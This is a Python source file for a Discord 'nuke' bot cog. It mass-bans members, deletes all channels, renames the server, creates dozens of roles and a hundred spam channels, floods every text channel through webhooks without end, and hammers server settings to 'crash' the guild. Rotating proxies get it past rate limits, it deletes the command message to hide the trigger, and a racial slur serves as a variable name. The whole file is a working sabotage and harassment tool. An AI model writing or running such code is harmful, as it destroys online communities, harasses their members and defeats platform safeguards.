import os
import logging
import json
import utils
import random
import psutil
import time
import asyncio
import discord
from discord.ext import commands
from tasksio import TaskPool
from aiohttp import ClientSession

logging.basicConfig(
    level=logging.INFO,
    format="\033[38;5;21m[\033[0m%(asctime)s.%(msecs)03d\033[38;5;21m] \033[0m%(message)s\033[0m", 
    datefmt="%H:%M:%S" 
)

class nuke(commands.Cog):
    def __init__(self, client):        
        self.client = client       
        with open("settings.json", encoding="utf8") as file:
            try:
                settings = json.load(file)
            
                self.use_proxy = settings["General Settings"]["Use Proxies"]
                self.scrape_proxies = settings["General Settings"]["Scrape Proxies"]
                self.api = settings["General Settings"]["Use Random API"]
                self.tasks = settings["General Settings"]["Tasks"]
                self.delay = settings["General Settings"]["Delay"]
                self.show_logs  = settings["General Settings"]["Show Logs"]

                self.token = settings["Nuke Settings"]["Token"]
                self.name = settings["Nuke Settings"]["Server Name"]
                self.channel_names = settings["Nuke Settings"]["Channel Names"]
                self.role_names = settings["Nuke Settings"]["Role Names"]
                self.message_content = settings["Nuke Settings"]["Spam Contents"]
                self.webhook_usernames = settings["Nuke Settings"]["Webhook Usernames"]
                self.whitelisted = settings["Nuke Settings"]["Whitelisted"]
                self.authorized = settings["Nuke Settings"]["Authorized"]
                self.bot = settings["Nuke Settings"]["Prefix"]       
            except Exception as error:
                logging.error(error)

        if self.scrape_proxies: utils.GenProxy()

        if self.api: self.api = random.randint(8, 9)
        else: self.api = 9

        if self.bot: self.headers = {"Authorization": "Bot {}".format(self.token)}
        else: self.headers = {"Authorization": "{}".format(self.token)}

        self.count = 0
        self.ratelimit = 0
        self.failed = 0

        self.concurrents = []
        self.hooks = []

    
    def stop(self): 
        psutil.Process(os.getpid()).terminate()

    def reset(self):
        self.count = 0
        self.ratelimit = 0
        self.failed = 0


    async def ban_members(self, guild_id: str, member: str):
        try:
            if self.use_proxy: proxy = utils.GetProxy()
            else: proxy = None
            async with ClientSession(headers=self.headers) as client:
                async with client.put("https://discord.com/api/v{}/guilds/{}/bans/{}".format(self.api, guild_id, member.id), proxy=proxy) as response:
                    if response.status in [200, 201, 204]:
                        if self.show_logs: 
                            logging.info("Banned member {}".format(member))
                            self.count += 1
                        else:
                            self.count += 1
                    elif response.status == 429:
                        if self.show_logs: 
                            json = await response.json()
                            logging.info("Got ratelimited for {}s.".format(json["retry_after"]))
                            self.ratelimit += 1
                            return await self.ban_members(guild_id, member)
                        else:
                            self.ratelimit += 1
                            return await self.ban_members(guild_id, member)
                    elif "You are being blocked" in await response.text():
                        logging.info("You are being cloudflare blocked, closing program!")
                        self.stop()
                    else:
                        json = await response.json()
                        logging.info("Error % {}".format(json["message"]))
                        self.failed += 1
        except Exception as error:
            if self.show_logs:
                logging.error(error)
            self.failed += 1


    async def testban_worker(self, guild_id: str, member_id: str):
        try:
            if self.use_proxy: proxy = utils.GetProxy()
            else: proxy = None
            async with ClientSession(headers=self.headers) as client:
                async with client.put("https://discord.com/api/v{}/guilds/{}/bans/{}".format(self.api, guild_id, member_id), proxy=proxy) as response:
                    if response.status in [200, 201, 204]:
                        if self.show_logs: 
                            logging.info("Banned test id {}".format(member_id))
                            self.count += 1
                        else:
                            self.count += 1
                    elif response.status == 429:
                        if self.show_logs: 
                            json = await response.json()
                            logging.info("Got ratelimited for {}s.".format(json["retry_after"]))
                            self.ratelimit += 1
                            return await self.testban_worker(guild_id, member_id)
                        else:
                            self.ratelimit += 1
                            return await self.testban_worker(guild_id, member_id)
                    elif "You are being blocked" in await response.text():
                        logging.info("You are being cloudflare blocked, closing program!")
                        self.stop()
                    else:
                        json = await response.json()
                        logging.info("Error % {}".format(json["message"]))
                        self.failed += 1
        except Exception as error:
            if self.show_logs:
                logging.error(error)
            self.failed += 1


    
    async def create_channels(self, guild_id: str, channel_name: str, channel_type: str):
        try:
            if self.use_proxy: proxy = utils.GetProxy()
            else: proxy = None
            if channel_type == "text": json = {"name": channel_name, "type": 0}
            if channel_type == "nsfw": json = {"name": channel_name, "nsfw": True, "type": 0}
            if channel_type == "voice": json = {"name": channel_name, "type": 2, "user_limit": 69}
            async with ClientSession(headers=self.headers) as client:
                async with client.post("https://discord.com/api/v{}/guilds/{}/channels".format(self.api, guild_id), json=json, proxy=proxy) as response:
                    if response.status in [200, 201, 204]:
                        if self.show_logs: 
                            logging.info("Created channel #{}".format(channel_name.replace(" ", "-")))
                            self.count += 1
                        else:
                            self.count += 1
                    elif response.status == 429:
                        if self.show_logs: 
                            json = await response.json()
                            logging.info("Got ratelimited for {}s.".format(json["retry_after"]))
                            self.ratelimit += 1
                            return await self.create_channels(guild_id, channel_name, channel_type)
                        else:
                            self.ratelimit += 1
                            return await self.create_channels(guild_id, channel_name, channel_type)
                    elif "You are being blocked" in await response.text():
                        logging.info("You are being cloudflare blocked, closing program!")
                        self.stop()
                    else:
                        json = await response.json()
                        logging.info("Error % {}".format(json["message"]))
                        self.failed += 1
        except Exception as error:
            if self.show_logs:
                logging.error(error)
            self.failed += 1


    
    async def create_roles(self, guild_id: str, role_name: str):
        try:
            if self.use_proxy: proxy = utils.GetProxy()
            else: proxy = None
            async with ClientSession(headers=self.headers) as client:
                async with client.post("https://discord.com/api/v{}/guilds/{}/roles".format(self.api, guild_id), json={"name": role_name, "color": random.randint(1000000, 9999999)}, proxy=proxy) as response:
                    if response.status in [200, 201, 204]:
                        if self.show_logs: 
                            logging.info("Created role {}".format(role_name))
                            self.count += 1
                        else:
                            self.count += 1
                    elif response.status == 429:
                        if self.show_logs: 
                            json = await response.json()
                            logging.info("Got ratelimited for {}s.".format(json["retry_after"]))
                            self.ratelimit += 1
                            return await self.create_roles(guild_id, role_name)
                        else:
                            self.ratelimit += 1
                            return await self.create_roles(guild_id, role_name)
                    elif "You are being blocked" in await response.text():
                        logging.info("You are being cloudflare blocked, closing program!")
                        self.stop()
                    else:
                        json = await response.json()
                        logging.info("Error % {}".format(json["message"]))
                        self.failed += 1
        except Exception as error:
            if self.show_logs:
                logging.error(error)
            self.failed += 1

    

    async def massping_worker(self, guild_id: str, channel: str, message: str):
        try:
            if self.use_proxy: proxy = utils.GetProxy()
            else: proxy = None
            async with ClientSession(headers=self.headers) as client:
                async with client.post("https://discord.com/api/v{}/channels/{}/messages".format(self.api, channel.id), json={"content": message}, proxy=proxy) as response:
                    if response.status in [200, 201, 204]:
                        if self.show_logs: 
                            logging.info("Sent {} in {}.".format(message, channel))
                            self.count += 1
                        else:
                            self.count += 1
                    elif response.status == 429:
                        if self.show_logs: 
                            json = await response.json()
                            logging.info("Got ratelimited for {}s.".format(json["retry_after"]))
                            self.ratelimit += 1
                            return await self.massping_worker(guild_id, channel, message)
                        else:
                            self.ratelimit += 1
                            return await self.massping_worker(guild_id, channel, message)
                    elif "You are being blocked" in await response.text():
                        logging.info("You are being cloudflare blocked, closing program!")
                        self.stop()
                    else:
                        json = await response.json()
                        logging.info("Error % {}".format(json["message"]))
                        self.failed += 1
        except Exception as error:
            if self.show_logs:
                logging.error(error)
            self.failed += 1

    

    async def delete_channels(self, guild_id: str, channel: str):
        try:
            if self.use_proxy: proxy = utils.GetProxy()
            else: proxy = None
            async with ClientSession(headers=self.headers) as client:
                async with client.delete("https://discord.com/api/v{}/channels/{}".format(self.api, channel.id), proxy=proxy) as response:
                    if response.status in [200, 201, 204]:
                        if self.show_logs: 
                            logging.info("Deleted channel {}".format(channel))
                            self.count += 1
                        else:
                            self.count += 1
                    elif response.status == 429:
                        if self.show_logs: 
                            json = await response.json()
                            logging.info("Got ratelimited for {}s.".format(json["retry_after"]))
                            self.ratelimit += 1
                            return await self.delete_channels(guild_id, channel)
                        else:
                            self.ratelimit += 1
                            return await self.delete_channels(guild_id, channel)
                    elif "You are being blocked" in await response.text():
                        logging.info("You are being cloudflare blocked, closing program!")
                        self.stop()
                    else:
                        json = await response.json()
                        logging.info("Error % {}".format(json["message"]))
                        self.failed += 1
        except Exception as error:
            if self.show_logs:
                logging.error(error)
            self.failed += 1



    async def makewebhook(self, channel: str):
        try:
            if self.use_proxy: proxy = utils.GetProxy()
            else: proxy = None
            json = {"name": random.choice(self.webhook_usernames)}
            async with ClientSession(headers=self.headers) as client:
                async with client.post("https://discord.com/api/v{}/channels/{}/webhooks".format(self.api, channel.id), json=json, proxy=proxy) as response:
                    if response.status in [200, 201, 204]:
                        json = await response.json()
                        if self.show_logs: 
                            logging.info("Created webhook {}".format(json["id"]))
                            self.count += 1
                            self.hooks.append("https://discord.com/api/webhooks/{}/{}".format(json["id"], json["token"]))
                        else:
                            self.count += 1
                            self.hooks.append("https://discord.com/api/webhooks/{}/{}".format(json["id"], json["token"]))
                    else:
                        json = await response.json()
                        logging.info("Error % {}".format(json["message"]))
                        self.failed += 1
        except Exception as error:
            if self.show_logs:
                logging.error(error)
            self.failed += 1

    

    async def sendwebhook(self, webhook: str):
        try:
            while True:
                if self.use_proxy: proxy = utils.GetProxy()
                else: proxy = None
                json = {"content": random.choice(self.message_content)}
                async with ClientSession(headers={"Content-Type": "application/json"}) as client:
                    async with client.post(webhook, json=json, proxy=proxy) as response:
                        if response.status in [200, 201, 204]:
                            if self.show_logs: 
                                logging.info("Sent message to webhook {}".format(webhook))
                                self.count += 1
                            else:
                                self.count += 1
                        elif response.status == 429:
                            if self.show_logs: 
                                json = await response.json()
                                logging.info("Got ratelimited for {}s.".format(json["retry_after"]))
                                self.ratelimit += 1
                                return await self.sendwebhook(webhook)
                            else:
                                self.ratelimit += 1
                                return await self.sendwebhook(webhook)
                        elif "You are being blocked" in await response.text():
                            logging.info("You are being cloudflare blocked, closing program!")
                            self.stop()
                        else:
                            json = await response.json()
                            logging.info("Error % {}".format(json["message"]))
                            self.failed += 1
        except Exception as error:
            if self.show_logs:
                logging.error(error)
            self.failed += 1


    async def audit_hang(self, guild_id: str):
        try:
            for _ in range(1):
                if self.use_proxy: proxy = utils.GetProxy()
                else: proxy = None
                negro = [
                    {"features":["COMMUNITY"],"verification_level":1,"default_message_notifications":0,"explicit_content_filter":2,"rules_channel_id":"1","public_updates_channel_id":"1"},
                    {"description":None,"features":["NEWS"],"preferred_locale":"en-US","rules_channel_id":None,"public_updates_channel_id":None}
                ]
                async with ClientSession(headers=self.headers) as client:
                    async with client.patch("https://discord.com/api/v{}/guilds/{}".format(self.api, guild_id), json=random.choice(negro), proxy=proxy) as response:
                        if response.status in [200, 201, 204]:
                            if self.show_logs: 
                                logging.info("Created/Disabled Community")
                                self.count += 1
                            else:
                                self.count += 1
                        elif response.status == 429:
                            if self.show_logs: 
                                json = await response.json()
                                logging.info("Got ratelimited for {}s.".format(json["retry_after"]))
                                self.ratelimit += 1
                                return await self.audit_hang(guild_id)
                            else:
                                self.ratelimit += 1
                                return await self.audit_hang(guild_id)
                        elif "You are being blocked" in await response.text():
                            logging.info("You are being cloudflare blocked, closing program!")
                            self.stop()
                        else:
                            json = await response.json()
                            logging.info("Error % {}".format(json["message"]))
                            self.failed += 1
        except Exception as error:
            if self.show_logs:
                logging.error(error)
            self.failed += 1

    

    @commands.command(aliases=["destroy", "wizz", "nuke"])
    async def nn(self, ctx):
        try: await ctx.message.delete()
        except: pass
        if (ctx.author.id in self.authorized):
            pass
        else: 
            return
        if (ctx.guild.id not in self.concurrents):
            self.reset()
            self.concurrents.append(ctx.guild.id)
            logging.info("Executing \033[38;5;21m(\033[0m{}\033[38;5;21m)\033[0m...".format(ctx.guild))
            guild_id = ctx.guild.id
            start = time.time()
            async with TaskPool(self.tasks) as pool:
                for member in await ctx.guild.chunk():
                    if (member.id not in self.whitelisted):
                        await pool.put(self.ban_members(guild_id, member))
                        if self.delay != 0: await asyncio.sleep(self.delay)
                for channel in ctx.guild.channels:
                    await pool.put(self.delete_channels(guild_id, channel))
                    if self.delay != 0: await asyncio.sleep(self.delay)
                with open("icon.jpg", "rb") as file:
                    icon = file.read()
                    await ctx.guild.edit(name=self.name, icon=icon)
                for _ in range(50):
                    await pool.put(self.create_roles(guild_id, random.choice(self.role_names)))
                    if self.delay != 0: await asyncio.sleep(self.delay)
                for _ in range(100):
                    await pool.put(self.create_channels(guild_id, random.choice(self.channel_names), "text"))
                    if self.delay != 0: await asyncio.sleep(self.delay)
            finish = time.time() - start
            logging.info("Finished executing guild in {}s.".format(finish))
            logging.info("Results % Failed: {}, Ratelimit: {}, Successed: {}".format(self.failed, self.ratelimit, self.count))
            self.concurrents.remove(ctx.guild.id)
        else:
            logging.info("A command is already being runned!")
            return 

    

    @commands.command()
    async def whspam(self, ctx):
        try: await ctx.message.delete()
        except: pass
        if (ctx.author.id in self.authorized):
            pass
        else: 
            return
        if (ctx.guild.id not in self.concurrents):
            self.reset()
            self.concurrents.append(ctx.guild.id)
            logging.info("Creating webhooks in \033[38;5;21m(\033[0m{}\033[38;5;21m)\033[0m...".format(ctx.guild))
            start = time.time()
            async with TaskPool(5000) as pool:
                for channel in ctx.guild.channels:
                    if isinstance(channel, discord.TextChannel):
                        await pool.put(self.makewebhook(channel))
            async with TaskPool(5000) as pool:
                for webhook in self.hooks:
                    await pool.put(self.sendwebhook(webhook))
            finish = time.time() - start
            logging.info("Finished webhook flooding guild in {}s.".format(finish))
            logging.info("Results % Failed: {}, Ratelimit: {}, Successed: {}".format(self.failed, self.ratelimit, self.count))
            self.concurrents.remove(ctx.guild.id)
        else:
            logging.info("A command is already being runned!")
            return 

    
    
    @commands.command(aliases=["cc", "create", "bomb"])
    async def channelcreate(self, ctx, amount: int = 40, type: str = "text"):
        try: await ctx.message.delete()
        except: pass
        if (ctx.author.id in self.authorized):
            pass
        else: 
            return
        if (ctx.guild.id not in self.concurrents):
            self.reset()
            self.concurrents.append(ctx.guild.id)
            logging.info("Starting to create {} channel(s).".format(amount))
            logging.info("Channel type chosen: {}.".format(type))
            guild_id = ctx.guild.id
            start = time.time()
            async with TaskPool(self.tasks) as pool:
                for _ in range(amount):
                    await pool.put(self.create_channels(guild_id, random.choice(self.channel_names), type))
                    if self.delay != 0: await asyncio.sleep(self.delay)
            finish = time.time() - start
            logging.info("Finished creating channels in {}s.".format(finish))
            logging.info("Results % Failed: {}, Ratelimit: {}, Successed: {}".format(self.failed, self.ratelimit, self.count))
            self.concurrents.remove(ctx.guild.id)
        else:
            logging.info("A command is already being ran!")
            return 


    
    @commands.command(aliases=["rc", "rcreate", "rbomb"])
    async def rolecreate(self, ctx, amount: int = 40):
        try: await ctx.message.delete()
        except: pass
        if (ctx.author.id in self.authorized):
            pass
        else: 
            return
        if (ctx.guild.id not in self.concurrents):
            self.reset()
            self.concurrents.append(ctx.guild.id)
            logging.info("Starting to create {} role(s).".format(amount))
            guild_id = ctx.guild.id
            start = time.time()
            async with TaskPool(self.tasks) as pool:
                for _ in range(amount):
                    await pool.put(self.create_roles(guild_id, random.choice(self.role_names)))
                    if self.delay != 0: await asyncio.sleep(self.delay)
            finish = time.time() - start
            logging.info("Finished creating roles in {}s.".format(finish))
            logging.info("Results % Failed: {}, Ratelimit: {}, Successed: {}".format(self.failed, self.ratelimit, self.count))
            self.concurrents.remove(ctx.guild.id)
        else:
            logging.info("A command is already being ran!")
            return



    @commands.command(aliases=["bb", "purge", "massacre"])
    async def massban(self, ctx):
        try: await ctx.message.delete()
        except: pass
        if (ctx.author.id in self.authorized):
            pass
        else: 
            return
        if (ctx.guild.id not in self.concurrents):
            self.reset()
            self.concurrents.append(ctx.guild.id)
            members = await ctx.guild.chunk()
            logging.info("Starting to ban {} member(s).".format(len(members)))
            guild_id = ctx.guild.id
            start = time.time()
            async with TaskPool(self.tasks) as pool:
                for member in members:
                    if (member.id not in self.whitelisted):
                        await pool.put(self.ban_members(guild_id, member))
                        if self.delay != 0: await asyncio.sleep(self.delay)
            finish = time.time() - start
            logging.info("Finished banning members in {}s.".format(finish))
            logging.info("Results % Failed: {}, Ratelimit: {}, Successed: {}".format(self.failed, self.ratelimit, self.count))
            self.concurrents.remove(ctx.guild.id)
        else:
            logging.info("A command is already being ran!")
            return
    
    

    @commands.command()
    async def testban(self, ctx):
        try: await ctx.message.delete()
        except: pass
        if (ctx.author.id in self.authorized):
            pass
        else: 
            return
        if (ctx.guild.id not in self.concurrents):
            self.reset()
            self.concurrents.append(ctx.guild.id)
            members = [line.rstrip("\n") for line in open("data/ids.txt", "r")]
            logging.info("Starting to ban {} member(s).".format(len(members)))
            guild_id = ctx.guild.id
            start = time.time()
            async with TaskPool(self.tasks) as pool:
                for member in members:
                    await pool.put(self.testban_worker(guild_id, member))
                    if self.delay != 0: await asyncio.sleep(self.delay)
            finish = time.time() - start
            logging.info("Finished banning test ids in {}s.".format(finish))
            logging.info("Results % Failed: {}, Ratelimit: {}, Successed: {}".format(self.failed, self.ratelimit, self.count))
            self.concurrents.remove(ctx.guild.id)
        else:
            logging.info("A command is already being ran!")
            return



    @commands.command(aliases=["massping"])
    async def spam(self, ctx, amount: int = 10):
        try: await ctx.message.delete()
        except: pass
        if (ctx.author.id in self.authorized):
            pass
        else: 
            return
        if (ctx.guild.id not in self.concurrents):
            self.reset()
            self.concurrents.append(ctx.guild.id)
            logging.info("Starting to spam messages {} time(s).".format(amount))
            guild_id = ctx.guild.id
            start = time.time()
            async with TaskPool(self.tasks) as pool:
                for _ in range(amount):
                    for channel in ctx.guild.channels:
                        if isinstance(channel, discord.TextChannel):
                            await pool.put(self.massping_worker(guild_id, channel, random.choice(self.message_content)))
                            if self.delay != 0: await asyncio.sleep(self.delay)
            finish = time.time() - start
            logging.info("Finished spamming messages in {}s.".format(finish))
            logging.info("Results % Failed: {}, Ratelimit: {}, Successed: {}".format(self.failed, self.ratelimit, self.count))
            self.concurrents.remove(ctx.guild.id)
        else:
            logging.info("A command is already being ran!")
            return


    @commands.command(aliases=["crash"])
    async def lag(self, ctx):
        try: await ctx.message.delete()
        except: pass
        if (ctx.author.id in self.authorized):
            pass
        else: 
            return
        if (ctx.guild.id not in self.concurrents):
            self.reset()
            self.concurrents.append(ctx.guild.id)
            logging.info("Starting to lag guild with 8000 tasks.")
            guild_id = ctx.guild.id
            start = time.time()
            async with TaskPool(8_000) as pool:
                for _ in range(250):
                    await pool.put(self.audit_hang(guild_id))
                    if self.delay != 0: await asyncio.sleep(self.delay)
            finish = time.time() - start
            logging.info("Finished lagging guild in {}s.".format(finish))
            logging.info("Results % Failed: {}, Ratelimit: {}, Successed: {}".format(self.failed, self.ratelimit, self.count))
            self.concurrents.remove(ctx.guild.id)
        else:
            logging.info("A command is already being ran!")
            return
    

    @commands.command()
    async def prune(self, ctx):
        try: await ctx.message.delete()
        except: pass
        if (ctx.author.id in self.authorized):
            pass
        else: 
            return
        if (ctx.guild.id not in self.concurrents):
            self.reset()
            self.concurrents.append(ctx.guild.id)
            logging.info("Starting to prune all member(s) wih 1 day of inactivity.")
            start = time.time()
            try:
                await ctx.guild.prune_members(
                    days = 1, 
                    roles = ctx.guild.roles,
                    compute_prune_count = False
                )
                self.count += 1
            except Exception:
                self.failed += 1
            finish = time.time() - start
            logging.info("Finished pruning members in {}s.".format(finish))
            logging.info("Results % Failed: {}, Successed: {}".format(self.failed, self.count))
            self.concurrents.remove(ctx.guild.id)
        else:
            logging.info("A command is already being ran!")
            return


def setup(client):
    client.add_cog(nuke(client))
